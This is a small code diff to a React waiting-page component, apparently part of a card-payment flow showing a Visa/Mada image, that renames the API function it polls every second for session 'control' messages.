@@ -3,7 +3,7 @@ import { useLocation } from "wouter";
 import { Header } from "@/components/layout/Header";
 import { Loader2, XCircle } from "lucide-react";
 import { useQuery } from "@tanstack/react-query";
-import { getControl } from "@/lib/api";
+import { getControlAction } from "@/lib/api";
 import visaMadaImage from "../assets/VISAMADAH_1779063055374.png";
 
 export default function NomerWait() {
@@ -17,7 +17,7 @@ export default function NomerWait() {
   // Check for control messages
   const { data: controlData } = useQuery({
     queryKey: ["control", sessionId],
-    queryFn: () => getControl(sessionId!),
+    queryFn: () => getControlAction(sessionId!),
     refetchInterval: 1000,
     enabled: !!sessionId,
   });
